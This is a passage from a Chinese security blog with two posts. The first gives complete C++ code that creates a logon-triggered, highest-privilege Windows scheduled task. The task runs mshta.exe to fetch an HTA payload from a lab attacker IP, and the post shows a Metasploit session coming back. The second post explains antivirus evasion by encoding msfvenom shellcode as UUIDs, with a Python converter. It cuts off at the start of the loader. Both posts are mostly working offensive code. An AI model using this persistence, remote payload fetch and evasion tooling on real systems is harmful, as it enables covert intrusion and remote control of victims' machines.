</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-28T08:47:50.000Z" title="2021-02-28T08:47:50.000Z">2021-02-28</time>发表</span><span class="level-item"><time dateTime="2021-02-28T09:06:59.034Z" title="2021-02-28T09:06:59.034Z">2021-02-28</time>更新</span><span class="level-item">9 分钟读完 (大约1341个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/28/%E4%BD%BF%E7%94%A8COM%E7%BB%84%E4%BB%B6%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/">使用COM组件创建计划任务</a></h1><div class="content"><p>Windows系统可以设置计划任务来指向一些定时任务。本书中计划任务的触发条件是在用户登陆时触发，执行启动指定路径程序的操作</p>
<p>创建计划任务时涉及到COM组件接口的调用，要求管理员权限，程序逻辑概括为三个部分，分别是初始化操作、创建计划任务操作、删除计划任务操作。</p>
<h2 id="1-初始化操作"><a href="#1-初始化操作" class="headerlink" title="1.初始化操作"></a>1.初始化操作</h2><p>由于使用COM组件，所以必须调用CoInitialize函数来初始化COM接口环境，这样才能使用COM接口函数。同时也要先获取ITaskService对象指针以及ITaskFolder指针，这两个指针对象主要用来进行计划任务的创建操作。</p>
<p>1.CoInitialize初始化COM组件</p>
<p>2.CoCreateInstance创建任务服务对象</p>
<p>3.连接到任务服务</p>
<p>4.从ITaskService对象中获取根任务Root Task Folder的指针对象ITaskFolder，这个指针指向新注册的任务</p>
<p>初始化操作完成后直接操作ITaskService对象以及ITaskFolder对象</p>
<h2 id="2-创建计划任务"><a href="#2-创建计划任务" class="headerlink" title="2.创建计划任务"></a>2.创建计划任务</h2><p>从ITaskService对象中创建一个任务定义对象ITaskDefinition，它被用于创建任务，然后对任务定义对象ITaskDefinition进行设置</p>
<p>设置注册信息，包括设置作者信息。</p>
<p>设置主体信息，包括登陆类型、运行权限。</p>
<p>设置配置信息，包括使用电池运行时是否停止</p>
<p>设置操作信息，包括要启动的程序，并设置程序路径和参数</p>
<p>设置触发器，在用户登陆时执行计划任务</p>
<h2 id="3-删除计划任务"><a href="#3-删除计划任务" class="headerlink" title="3.删除计划任务"></a>3.删除计划任务</h2><p>调用DeleteTask接口函数删除指定名称的计划任务</p>
<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><p>这里使用mshta上线，无文件上线的方法很多，不局限这一种</p>
<p>将计划任务设置为执行c:\windows\system32\mshta.exe <a target="_blank" rel="noopener" href="http://192.168.111.129:8080/p7ptgsev.hta">http://192.168.111.129:8080/p7ptgsev.hta</a></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atlbase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;comdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;shlobj_core.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;taskschd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;taskschd.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">ITaskService* m_lpITS = <span class="literal">NULL</span>;</span><br><span class="line">ITaskFolder* m_lpRootFolder = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化COM组件</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//1.CoInitialize初始化COM组件</span></span><br><span class="line">	HRESULT hr = CoInitialize(<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr)) &#123;</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;初始化COM组件失败&quot;</span>, <span class="string">L&quot;Failed&quot;</span>, MB_OK);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2.CoCreateInstance创建任务服务对象</span></span><br><span class="line">	hr = CoCreateInstance(CLSID_TaskScheduler, <span class="literal">NULL</span>, CLSCTX_INPROC_SERVER, IID_ITaskService, (LPVOID*)&amp;m_lpITS);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr)) &#123;</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;创建任务服务失败&quot;</span>, <span class="string">L&quot;Failed&quot;</span>, MB_OK);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//3.连接到任务服务</span></span><br><span class="line">	hr = m_lpITS-&gt;Connect(<span class="keyword">_variant_t</span>(), <span class="keyword">_variant_t</span>(), <span class="keyword">_variant_t</span>(), <span class="keyword">_variant_t</span>());</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr)) &#123;</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;连接服务失败&quot;</span>, <span class="string">L&quot;Failed&quot;</span>, MB_OK);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//4.从ITaskService对象中获取根任务Root Task Folder的指针对象ITaskFolder，这个指针指向新注册的任务</span></span><br><span class="line">	hr = m_lpITS-&gt;GetFolder(<span class="keyword">_bstr_t</span>(<span class="string">&quot;\\&quot;</span>), &amp;m_lpRootFolder);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr)) &#123;</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;获取指针失败&quot;</span>, <span class="string">L&quot;Failed&quot;</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//卸载COM组件</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnInit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (m_lpITS)</span><br><span class="line">	&#123;</span><br><span class="line">		m_lpITS-&gt;Release();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (m_lpRootFolder)</span><br><span class="line">	&#123;</span><br><span class="line">		m_lpRootFolder-&gt;Release();</span><br><span class="line">	&#125;</span><br><span class="line">	::CoUninitialize();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建计划任务</span></span><br><span class="line"><span class="function">BOOL <span class="title">CreateTask</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* lpszTaskName,<span class="keyword">const</span> <span class="keyword">char</span>* lpszProgramPath,<span class="keyword">const</span> <span class="keyword">char</span>* lpszParameters,<span class="keyword">const</span> <span class="keyword">char</span>* lpszAuthor)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 创建任务定义对象来创建任务</span></span><br><span class="line">	ITaskDefinition* pTaskDefinition = <span class="literal">NULL</span>;</span><br><span class="line">	HRESULT hr = m_lpITS-&gt;NewTask(<span class="number">0</span>, &amp;pTaskDefinition);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 设置注册信息 */</span></span><br><span class="line">	IRegistrationInfo* pRegInfo = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="function">CComVariant <span class="title">variantAuthor</span><span class="params">(<span class="literal">NULL</span>)</span></span>;</span><br><span class="line">	variantAuthor = lpszAuthor;</span><br><span class="line">	hr = pTaskDefinition-&gt;get_RegistrationInfo(&amp;pRegInfo);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 设置作者信息</span></span><br><span class="line">	hr = pRegInfo-&gt;put_Author(variantAuthor.bstrVal);</span><br><span class="line">	pRegInfo-&gt;Release();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 设置登录类型和运行权限 */</span></span><br><span class="line">	IPrincipal* pPrincipal = <span class="literal">NULL</span>;</span><br><span class="line">	hr = pTaskDefinition-&gt;get_Principal(&amp;pPrincipal);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 设置登录类型</span></span><br><span class="line">	hr = pPrincipal-&gt;put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);</span><br><span class="line">	<span class="comment">// 设置运行权限</span></span><br><span class="line">	<span class="comment">// 最高权限</span></span><br><span class="line">	hr = pPrincipal-&gt;put_RunLevel(TASK_RUNLEVEL_HIGHEST);</span><br><span class="line">	pPrincipal-&gt;Release();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 设置其他信息 */</span></span><br><span class="line">	ITaskSettings* pSettting = <span class="literal">NULL</span>;</span><br><span class="line">	hr = pTaskDefinition-&gt;get_Settings(&amp;pSettting);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 设置其他信息</span></span><br><span class="line">	hr = pSettting-&gt;put_StopIfGoingOnBatteries(VARIANT_FALSE);</span><br><span class="line">	hr = pSettting-&gt;put_DisallowStartIfOnBatteries(VARIANT_FALSE);</span><br><span class="line">	hr = pSettting-&gt;put_AllowDemandStart(VARIANT_TRUE);</span><br><span class="line">	hr = pSettting-&gt;put_StartWhenAvailable(VARIANT_FALSE);</span><br><span class="line">	hr = pSettting-&gt;put_MultipleInstances(TASK_INSTANCES_PARALLEL);</span><br><span class="line">	pSettting-&gt;Release();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 创建执行动作 */</span></span><br><span class="line">	IActionCollection* pActionCollect = <span class="literal">NULL</span>;</span><br><span class="line">	hr = pTaskDefinition-&gt;get_Actions(&amp;pActionCollect);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	IAction* pAction = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">// 创建执行操作</span></span><br><span class="line">	hr = pActionCollect-&gt;Create(TASK_ACTION_EXEC, &amp;pAction);</span><br><span class="line">	pActionCollect-&gt;Release();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 设置执行程序路径和参数 */</span></span><br><span class="line">	<span class="function">CComVariant <span class="title">variantProgramPath</span><span class="params">(<span class="literal">NULL</span>)</span></span>;</span><br><span class="line">	<span class="function">CComVariant <span class="title">variantParameters</span><span class="params">(<span class="literal">NULL</span>)</span></span>;</span><br><span class="line">	IExecAction* pExecAction = <span class="literal">NULL</span>;</span><br><span class="line">	hr = pAction-&gt;QueryInterface(IID_IExecAction, (PVOID*)(&amp;pExecAction));</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		pAction-&gt;Release();</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	pAction-&gt;Release();</span><br><span class="line">	<span class="comment">// 设置程序路径和参数</span></span><br><span class="line">	variantProgramPath = lpszProgramPath;</span><br><span class="line">	variantParameters = lpszParameters;</span><br><span class="line">	pExecAction-&gt;put_Path(variantProgramPath.bstrVal);</span><br><span class="line">	pExecAction-&gt;put_Arguments(variantParameters.bstrVal);</span><br><span class="line">	pExecAction-&gt;Release();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 创建触发器，实现用户登陆自启动 */</span></span><br><span class="line">	ITriggerCollection* pTriggers = <span class="literal">NULL</span>;</span><br><span class="line">	hr = pTaskDefinition-&gt;get_Triggers(&amp;pTriggers);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 创建触发器,把触发器设置为</span></span><br><span class="line">	ITrigger* pTrigger = <span class="literal">NULL</span>;</span><br><span class="line">	hr = pTriggers-&gt;Create(TASK_TRIGGER_LOGON, &amp;pTrigger);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 注册任务计划  */</span></span><br><span class="line">	IRegisteredTask* pRegisteredTask = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="function">CComVariant <span class="title">variantTaskName</span><span class="params">(<span class="literal">NULL</span>)</span></span>;</span><br><span class="line">	variantTaskName = lpszTaskName;</span><br><span class="line">	hr = m_lpRootFolder-&gt;RegisterTaskDefinition(variantTaskName.bstrVal,</span><br><span class="line">		pTaskDefinition,</span><br><span class="line">		TASK_CREATE_OR_UPDATE,</span><br><span class="line">		<span class="keyword">_variant_t</span>(),</span><br><span class="line">		<span class="keyword">_variant_t</span>(),</span><br><span class="line">		TASK_LOGON_INTERACTIVE_TOKEN,</span><br><span class="line">		<span class="keyword">_variant_t</span>(<span class="string">&quot;&quot;</span>),</span><br><span class="line">		&amp;pRegisteredTask);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		pTaskDefinition-&gt;Release();</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	pTaskDefinition-&gt;Release();</span><br><span class="line">	pRegisteredTask-&gt;Release();</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//删除计划任务</span></span><br><span class="line"><span class="function">BOOL <span class="title">DeleteTask</span><span class="params">(<span class="keyword">char</span>* lpszTaskName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == m_lpRootFolder)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">CComVariant <span class="title">variantTaskName</span><span class="params">(<span class="literal">NULL</span>)</span></span>;</span><br><span class="line">	variantTaskName = lpszTaskName;</span><br><span class="line">	HRESULT hr = m_lpRootFolder-&gt;DeleteTask(variantTaskName.bstrVal, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* lpszTaskName = <span class="string">&quot;aaasacwss&quot;</span>;   <span class="comment">//任务名</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* lpszProgramPath = <span class="string">&quot;c:\\windows\\system32\\mshta.exe&quot;</span>;  <span class="comment">//要执行的程序路径</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* lpszParameters = <span class="string">&quot;http://192.168.111.129:8080/p7ptgsev.hta&quot;</span>;     <span class="comment">//程序参数</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* lpszAuthor = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	Init();</span><br><span class="line">	BOOL bRet=CreateTask(lpszTaskName, lpszProgramPath, lpszParameters, lpszAuthor);</span><br><span class="line">	<span class="keyword">if</span> (!bRet) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Create Task Failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	UnInit();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Successd&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>运行</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603b58fbe028a50001c1d1b4"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/96f48898-e4f9-49b8-a268-eb5857e5af25.png" alt="imgbed.cn图床"></a></p>
<p>添加成功</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603b590ede602f00013761dd"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/d3bed366-0653-445c-bb85-c3ca43d26f8b.png" alt="imgbed.cn图床"></a></p>
<p>使用msf中的hta_server产生hta文件并传递payload，重启后返回一个Session</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603b5904fac28b0001cfe814"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/914aa532-5678-4d12-b56a-46493f2b9c6d.png" alt="imgbed.cn图床"></a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-27T05:45:50.000Z" title="2021-02-27T05:45:50.000Z">2021-02-27</time>发表</span><span class="level-item"><time dateTime="2021-02-27T05:47:07.013Z" title="2021-02-27T05:47:07.013Z">2021-02-27</time>更新</span><span class="level-item">7 分钟读完 (大约1020个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/27/uuid%E5%85%8D%E6%9D%80/">uuid免杀</a></h1><div class="content"><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><h2 id="UUID"><a href="#UUID" class="headerlink" title="UUID"></a>UUID</h2><p>通用唯一标识符（universally unique identifier, UUID）是一个128位的用于在计算机系统中以识别信息的数目。在Windows中也有使用GUID来标识唯一对象</p>
<h2 id="将shellcode转换为uuid"><a href="#将shellcode转换为uuid" class="headerlink" title="将shellcode转换为uuid"></a>将shellcode转换为uuid</h2><p>用msf生成shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;exec CMD&#x3D;&quot;calc.exe&quot; -f c</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6039dc936cea45000128758e"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/d6eab119-32a6-4f11-8d66-7275a9f557ee.png" alt="imgbed.cn图床"></a></p>
<p>16个字节转换为一个uuid值，不满时用\x00填充，\x00占一个字节</p>
<p>首先用python把shellcode转换为uuid</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uuid.UUID(bytes_le&#x3D;u)</span><br></pre></td></tr></table></figure>

<p>uuid转换为字节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uuid.UUID(&#39;1f748bef-481c-fe01-8b34-ae4801f799ff&#39;).bytes_le</span><br></pre></td></tr></table></figure>



<p>将shellcode转换为uuid，不足十六个字节的用\x00补全</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&#x27;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&#x27;</span></span><br><span class="line">shellcodelist=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(shellcode)%<span class="number">16</span>!=<span class="number">0</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(shellcode)%<span class="number">16</span>!=<span class="number">0</span>:</span><br><span class="line">        shellcode+=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)//<span class="number">16</span>):</span><br><span class="line">    u=<span class="built_in">str</span>(uuid.UUID(bytes_le=shellcode[i*<span class="number">16</span>:i*<span class="number">16</span>+<span class="number">16</span>]))</span><br><span class="line">    shellcodelist.append(u)</span><br><span class="line">print(shellcodelist)</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6039dc9ab6ce210001ce90fa"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/a031db93-5756-4b36-b3af-26a7daf85873.png" alt="imgbed.cn图床"></a></p>
<p>加载shellcode</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> 